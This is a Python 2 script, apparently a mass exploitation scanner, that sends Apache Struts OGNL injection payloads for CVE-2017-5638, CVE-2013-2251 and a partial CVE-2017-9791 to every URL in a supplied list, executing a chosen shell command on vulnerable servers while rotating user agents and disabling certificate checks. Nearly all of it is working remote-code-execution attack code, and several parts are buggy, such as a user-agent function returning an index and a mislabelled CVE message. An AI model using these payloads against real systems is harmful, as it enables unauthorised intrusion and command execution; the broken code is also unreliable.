#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib
import urllib2
import httplib
import multiprocessing
import argparse
import logging
import requests
import re  # normies get out
import sys
import random
import ssl


def post(url, data, headers):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        response = urllib2.urlopen(url, data, headers=headers, context=ctx, timeout=5)
    except Exception as err:
        logging.error("[-] ERROR at %s; %s" % (url, err))
    result = re.compile('[\\x00-\\x08\\x0b-\\x0c\\x0e-\\x1f]').sub('', response.read())

    return result


def getAgent():

    agents = [
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
        "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
        "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
        "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
        "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
        "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
        "Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
        "Mozilla/5.0 (Microsoft Windows NT 6.2.9200.0); rv:22.0) Gecko/20130405 Firefox/22.0",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20130514 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0"
    ]

    agent = random.randrange(0, (len(agents) - 1))
    return agent


def quote(data):
    return data.replace("#", "%23").replace("=", "%3d").replace(" ", "%20").replace("(", "%28").replace(")", "%29").replace("'", "%27")


def success(data):
    print "[+] %s" % str(data)


def create_command(input):
    return_val = ""
    for g in input.split(' '):
        return_val += '\'%s\',' % g
    return return_val.rstrip(",")


def cve_2013_2251(url, command):

    s2_16_path = '?redirect:${#a=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletRequest\'),#b=#a.getRealPath("/"),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#b),#matt.getWriter().flush(),#matt.getWriter().close()}'
    s2_16_payloads = (
        '?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
        '?redirectAction:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
        '?action:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
    )

    raw_path = requests.get(url + quote(s2_16_path), verify=False).content.replace("\r", "").replace("\n", "")
    command = command.replace("%RAW_PATH%", raw_path)
    command = create_command(command)

    for payload in s2_16_payloads:
        agent = getAgent()
        headers = {'User-Agent': agent}
        result = post(url, quote(payload).replace("PAYLOAD", quote(command)), headers)

        if "65a3e764068d229ee9d62906aee6cab72f96bacc" in result.read():
            sys.stdout.write("\033[1;31m")
            logging.info("[!] %s is VULN to CVE-2017-5638" % url.strip('\n'))
            sys.stdout.write("\033[0;0m")
            return True
        else:
            logging.debug("[-] %s is NOT vulnerable." % url.strip('\n'))
            return False



def cve_2017_5638(url, cmd):

    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:

        headers = {'User-Agent': getAgent(), 'Content-Type': payload}
        #request = urllib2.Request(url, headers=headers)
        #page = urllib2.urlopen(request).read()
        data = {}
        page = post(url, data, headers)

    except httplib.IncompleteRead, e:
        page = e.partial
    except urllib2.HTTPError as e:
        logging.error("[-] ERROR at %s; %s" % (url, e))
        page = ""
    except urllib2.URLError as e:
        logging.error("[-] ERROR at %s; %s" % (url, e))
        page = ""
    except Exception as e:
        logging.debug("[&] ERROR: uncaught exception; msg: %s" % e)
        page = ""

    if "65a3e764068d229ee9d62906aee6cab72f96bacc" in page:
        sys.stdout.write("\033[1;31m")
        logging.info("[!] %s is VULN to CVE-2017-5638" % url.strip('\n'))
        sys.stdout.write("\033[0;0m")
        return True
    else:
        logging.debug("[-] %s is NOT vulnerable." % url.strip('\n'))
        return False


def cve_2017_9791(url, cmd):

    # INCOMPLETE
    # YOU NEED TO HAVE A VALID FORM SUBMIT, SO TIS WILL REQUIRE BS4 TO SCRAPE ALL FORM FIELDS FOR A FORM SUBMIT
    # This could be a time consuming scan.
    payload = ""
    payload += "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    headers = {'User-Agent': getAgent()}

    data = {
        'ExampleForm': payload,
        'NotVulnParam': "hi",
        'NotVulnParam2': 2
    }

    data = urllib.urlencode(data)

    try:
        post(url, data, headers)

    except Exception as error:
        logging.error(error)


if __name__ == '__main__':

    banner = """
                                _.--.
                        _.-'_:-'||
                    _.-'_.-::::'||
               _.-:'_.-::::::'  ||
             .'`-.-:::::::'     ||
            /.'`;|:::::::'      ||_
           ||   ||::::::'     _.;._'-._
           ||   ||:::::'  _.-!oo @.!-._'-.
           \'.  ||:::::.-!()oo @!()@.-'_.|
            '.'-;|:.-'.&$@.& ()$%-'o.'\U||
              `>'-.!@%()@'@_%-'_.-o _.|'||
               ||-._'-.@.-'_.-' _.-o  |'||
               ||=[ '-._.-\U/.-'    o |'||
               || '-.]=|| |'|      o  |'||
               ||      || |'|        _| ';
               ||      || |'|    _.-'_.-'
               |'-._   || |'|_.-'_.-'
                '-._'-.|| |' `_.-'
                    '-.||_/.-'
 _______             __                  __                              __                         
/       \           /  |                /  |                            /  |                        
$$$$$$$  |  ______  $$ |____    ______  $$ |        ______    ______   _$$ |_     ______    ______  
$$ |__$$ | /      \ $$      \  /      \ $$ |       /      \  /      \ / $$   |   /      \  /      \ 
$$    $$< /$$$$$$  |$$$$$$$  |/$$$$$$  |$$ |      /$$$$$$  |/$$$$$$  |$$$$$$/   /$$$$$$  |/$$$$$$  |
$$$$$$$  |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |$$ |  $$ |  $$ | __ $$    $$ |$$ |  $$/ 
$$ |  $$ |$$ \__$$ |$$ |__$$ |$$ \__$$ |$$ |_____ $$ \__$$ |$$ \__$$ |  $$ |/  |$$$$$$$$/ $$ |      
$$ |  $$ |$$    $$/ $$    $$/ $$    $$/ $$       |$$    $$/ $$    $$/   $$  $$/ $$       |$$ |      
$$/   $$/  $$$$$$/  $$$$$$$/   $$$$$$/  $$$$$$$$/  $$$$$$/   $$$$$$/     $$$$/   $$$$$$$/ $$/       
                                                                                                    
    """

    print banner

    parser = argparse.ArgumentParser(prog='URL_Injection')
    parser.add_argument('-c', '--command', dest='cmd', help="Specify the command to inject", type=str, action='store')
    parser.add_argument('-f', '--file', dest='url_list', help="Specify the list of URLs", type=str, action='store', required=True),
    parser.add_argument('-s', '--select-cve', dest='cve_selector',
                        help="Select the CVE ID: 0:CVE-2017-5638, 1:CVE-2013-2251, 2:CVE-2017-9791", action='store_true')
    parser.add_argument('-o', '--out-file', dest='logger_output_loc',
                        help="Specify a path/filename. Default: ./output_vulnscan.log",
                        default='output_vulnscan.log',
                        action='store_true')
    args = parser.parse_args()

    # Set Logging Configuration
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        filename=args.logger_output_loc,
                        filemode='w')
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console.setFormatter(formatter)
    logging.getLogger('').addHandler(console)

    with open(args.url_list) as f:
        url_obj = f.readlines()

    for x in url_obj:

        x.strip('\n')
        try:

            logging.info("[*] Checking if %s is vulnerable" % x.strip('\n'))
            q = multiprocessing.Queue()
            q = multiprocessing.Pool(processes=7)
            p = q.Process(target=cve_2017_5638, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
            p.start()
            p2 = q.Process(target=cve_2013_2251, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
            p2.start()
            #p3 = q.Process(target=cve_2017_9791, args(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
            #p3.start()
        except Exception as e:

            logging.error(e)

    else:
        logging.error("[-] Shit broke on %s with error: %s" % (x, e))
        p.terminate()
